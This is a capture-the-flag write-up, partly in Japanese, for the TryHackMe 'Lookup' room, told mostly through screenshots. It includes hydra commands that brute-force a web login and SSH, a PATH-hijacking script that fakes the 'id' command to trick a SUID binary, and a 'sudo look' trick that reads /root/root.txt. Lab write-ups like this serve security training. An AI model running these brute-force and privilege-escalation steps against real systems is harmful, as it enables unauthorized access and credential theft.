## THM_Lookup
https://tryhackme.com/room/lookup

![image](https://github.com/user-attachments/assets/d267a808-be76-4ef7-85e3-dd5a371e8f83)

### 🚩User
![image](https://github.com/user-attachments/assets/a1fe0497-1056-4a48-a64b-b8931de06d7e)

![image](https://github.com/user-attachments/assets/35eb0aaf-cb55-4799-92c2-842225e1f1ac)

![image](https://github.com/user-attachments/assets/24e466d7-4de6-48a4-964c-c04c67e645c2)

According to error msg I am sure "admin" is enable.And I tried to hydra for getting admin password, but there is no credential.
So I seek for other users.
```
hydra lookup.thm -L /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=username" -p a
```
![image](https://github.com/user-attachments/assets/058c5430-6fe8-494a-9db9-f445c9ce0074)

```
hydra lookup.thm -l jose -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=Wrong password"  
```
![image](https://github.com/user-attachments/assets/1642b93d-af9b-404e-997b-b2dd62718d5d)


![image](https://github.com/user-attachments/assets/95808164-ee3d-4351-bff5-521f01d460d9)
<P>
Added /etc/hosts "files.lookup.thm"

![image](https://github.com/user-attachments/assets/0f553640-3c57-4771-8cb5-bcac492d59d4)

![image](https://github.com/user-attachments/assets/843f4bc1-59bd-49f2-9794-50cf5f6f7fac)

![image](https://github.com/user-attachments/assets/048a63b0-ab9b-40e4-9774-cbb746e5c970)

![image](https://github.com/user-attachments/assets/c373fdf3-228b-4cd4-a1a6-3f31f49784a5)

とにかくいつもの豆...めぼしいものがない

![image](https://github.com/user-attachments/assets/b0ead9fb-187d-4c84-ac3e-a2b123bffca3)

![image](https://github.com/user-attachments/assets/d1d949a7-11cf-4fec-937c-700bbec7a2aa)

IDで返却されたID以下のディレクトリの下のパスワードを開くっぽし、IDにthinkをわたせばよい

```
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```
![image](https://github.com/user-attachments/assets/715f7dfa-241f-4c8f-87bf-56610095f343)

どれかが有効なパスワードなはず

```
hydra -l think -P pass.txt ssh://10.10.62.113  
```
![image](https://github.com/user-attachments/assets/b4c8692d-569e-4816-9efe-0fcff22e1a2e)


### 🚩Root
![image](https://github.com/user-attachments/assets/478feb49-1f9f-4155-a812-4bb0f64547aa)

https://gtfobins.github.io/gtfobins/look/

![image](https://github.com/user-attachments/assets/3a9a1a99-ca7a-4f46-acbe-dc4ce39c8946)

```
LFILE=/root/root.txt
sudo look '' "$LFILE"
```

いつものやつのはずが、約一年ぶりですっかり忘れており疲れた
はるがくるといいなあ
💮😄💮😄💮
